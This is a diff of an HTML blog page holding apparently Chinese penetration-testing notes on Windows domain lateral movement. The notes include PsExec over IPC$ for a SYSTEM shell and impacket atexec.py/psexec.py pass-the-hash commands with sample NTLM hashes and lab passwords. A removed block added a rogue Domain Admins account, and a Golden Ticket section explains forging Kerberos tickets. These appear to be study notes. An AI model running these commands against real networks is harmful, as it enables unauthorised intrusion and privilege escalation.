@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">836</span>
+            <span class="post-count">891</span>
         </span>
     </span>
 
@@ -118,11 +118,30 @@
 
 
 <h3 id="psexec-ipc"><a href="#psexec-ipc" class="headerlink" title="psexec+ipc$"></a>psexec+ipc$</h3><p>前提是与目标主机建立ipc连接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.100\ipc$   建立ipc共享</span><br><span class="line"></span><br><span class="line">PsExec64.exe -accepteula \\&lt;目标机IP&gt; -s cmd.exe   #获得交互式shell，并且权限提升到system权限</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain</span><br><span class="line"></span><br><span class="line">net user hack 123qwe... &#x2F;add &#x2F;domain   #创建普通域用户</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admins&quot; hack &#x2F;add &#x2F;domain   #将普通域用户 提升为域管理</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.100\ipc$   建立ipc共享</span><br><span class="line"></span><br><span class="line">PsExec64.exe -accepteula \\&lt;目标机IP&gt; -s cmd.exe   #获得交互式shell，并且权限提升到system权限</span><br></pre></td></tr></table></figure>
 
 
 
-<h3 id="ipc-at"><a href="#ipc-at" class="headerlink" title="ipc+at"></a>ipc+at</h3><h3 id="ipc-schtasks"><a href="#ipc-schtasks" class="headerlink" title="ipc+schtasks"></a>ipc+schtasks</h3><h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><h1 id="winrm服务"><a href="#winrm服务" class="headerlink" title="winrm服务"></a>winrm服务</h1><h1 id="dcom"><a href="#dcom" class="headerlink" title="dcom"></a>dcom</h1><h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><h1 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h1><p>通常用来域内权限维持</p>
+<h3 id="ipc-at"><a href="#ipc-at" class="headerlink" title="ipc+at"></a>ipc+at</h3><h3 id="ipc-schtasks"><a href="#ipc-schtasks" class="headerlink" title="ipc+schtasks"></a>ipc+schtasks</h3><h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><ul>
+<li>开放135</li>
+</ul>
+<h1 id="winrm服务"><a href="#winrm服务" class="headerlink" title="winrm服务"></a>winrm服务</h1><h1 id="dcom"><a href="#dcom" class="headerlink" title="dcom"></a>dcom</h1><h1 id="windows服务"><a href="#windows服务" class="headerlink" title="windows服务"></a>windows服务</h1><h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><p>基于NTML hash认证  (windows认证方式)</p>
+<ul>
+<li>impacket</li>
+</ul>
+<p>atexec.py  直接hash传递进行命令执行，并提权system  （需要免杀）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 atexec.py -hashes :3c3ec769143bdd0ed99861d0fb79fc6b shmily.god&#x2F;Administrator@192.168.119.100 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">python3 atexec.py .&#x2F;administrator:admin123...@192.168.119.100 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>psexec.py </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:cd243e1e171da2c4edd1dd695bfbef5a shmily.god&#x2F;Administrator@192.168.119.100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python3 psexec.py shmily.god&#x2F;administrator:admin123...\!@192.168.119.100</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h1><p>通常用来域内<code>权限维持</code></p>
 <h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3><p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307225058167.png" alt="image-20220307225058167"></p>
 <p>krbtgt 是kdc服务使用账户，在Domain Admins组中，域环境中，用户账户的票据都是krbtgt生成的。</p>
 <p>如果攻击者拿到了 krbtgt的ntml hash或者AES-256值，<code>即可伪造任意用户身份</code></p>
